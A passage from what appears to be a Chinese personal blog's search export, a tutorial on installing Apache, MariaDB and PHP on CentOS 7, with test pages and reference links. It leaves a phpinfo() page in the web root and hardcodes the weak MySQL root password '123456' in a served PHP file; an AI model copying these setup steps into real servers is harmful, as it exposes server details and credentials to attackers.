class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">41636</span><br><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">41638</span><br><span class="hljs-attribute">service</span> nginx start#启动<br></code></pre></td></tr></table></figure><h2 id="二、LAMP"><a href="#二、LAMP" class="headerlink" title="二、LAMP"></a>二、LAMP</h2><h3 id="1-安装Apache"><a href="#1-安装Apache" class="headerlink" title="1.安装Apache"></a>1.安装Apache</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> httpd httpd-devel<br></code></pre></td></tr></table></figure><p>启动Apache服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> httpd<br></code></pre></td></tr></table></figure><p>设置httpd服务开机启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span>  httpd<br></code></pre></td></tr></table></figure><p>查看状态：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status httpd</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/cUaMdeq7Bp4X1ZA.png" alt="1564777207163.png"></p><p><img src="https://i.loli.net/2019/08/07/2HGzPth1V3W7Z8d.png" alt="1564777332886.png"></p><p>安装成功。</p><h3 id="2-安装mysql"><a href="#2-安装mysql" class="headerlink" title="2.安装mysql"></a>2.安装mysql</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">yum install mariadb mariadb-<span class="hljs-keyword">server</span> mariadb-libs mariadb-devel<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> |<span class="hljs-keyword">grep</span> maria<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/PCsZmazelgwTFkL.png" alt="1564777928551.png"></p><p>设置开机启动：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl start  mariadb <br><span class="hljs-params">system</span>ctl enable  mariadb <br></code></pre></td></tr></table></figure><h3 id="3-安装php"><a href="#3-安装php" class="headerlink" title="3.安装php"></a>3.安装php</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> php<br></code></pre></td></tr></table></figure><p>关联php和mysql：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> php-mysql<br></code></pre></td></tr></table></figure><p>安装常用php模块：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">yum install -y php-gd php-ldap php-odbc php-pear php-<span class="hljs-keyword">xml</span> <span class="hljs-title">php-xmlrpc</span> php-mbstring php-snmp php-soap curl curl-devel php-bcmath<br></code></pre></td></tr></table></figure><h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><p>在&#x2F;var&#x2F;www&#x2F;html目录下新建info.php文件，用于展示info信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>nfo.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重启服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart httpd</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/d5mT6ZepRNru3Fz.png" alt="1564779090168.png"></p><p>设置root密码（我设置为123456）：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mysql_secure_installation</span> <br></code></pre></td></tr></table></figure><p>创建mysql.php文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/my</span>sql.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);  <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;mysql success!!!!!&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/9zjBnXxg5CJVYTu.png" alt="2.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>CentOS7快速搭建LNMP环境：<a href="https://www.jianshu.com/p/02baa54283ba">https://www.jianshu.com/p/02baa54283ba</a></p><p>搭建centos7环境：<a href="https://help.aliyun.com/document_detail/97251.html#title-pli-3k4-4n3">https://help.aliyun.com/document_detail/97251.html#title-pli-3k4-4n3</a></p><p>nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use) 错误解决：<a href="https://blog.csdn.net/ownfire/article/details/7966645">https://blog.csdn.net/ownfire/article/details/7966645</a></p><p>linux安全加固：<a href="https://blog.csdn.net/qq_36119192/article/details/82906799">https://blog.csdn.net/qq_36119192/article/details/82906799</a></p><p>用yum快速搭建LAMP平台：<a href="https://www.cnblogs.com/me80/p/7218883.html">https://www.cnblogs.com/me80/p/7218883.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
